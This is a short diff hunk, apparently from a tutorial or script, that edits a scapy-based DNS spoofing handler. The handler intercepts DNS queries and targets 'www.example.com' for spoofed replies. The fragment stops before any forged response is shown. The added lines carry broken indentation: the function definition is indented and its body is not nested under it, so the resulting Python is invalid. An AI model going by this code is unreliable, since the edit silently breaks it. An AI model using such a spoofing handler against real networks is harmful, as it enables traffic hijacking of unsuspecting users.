@@ -79,11 +79,15 @@ If domain matches target:
         
 from scapy.all import *
 
-def spoof_dns(pkt):
-    # Step 1: Check if packet contains DNS query
-    if DNS in pkt and pkt[DNS].qd is not None:
-        qname = pkt[DNS].qd.qname.decode()
 
+    
+    
+        
+
+        def spoof_dns(pkt):
+        # Step 1: Check if packet contains DNS query
+        if DNS in pkt and pkt[DNS].qd is not None:
+        qname = pkt[DNS].qd.qname.decode()
         # Step 2: Target specific domain
         if "www.example.com" in qname:
             print("[*] Spoofing:", qname)
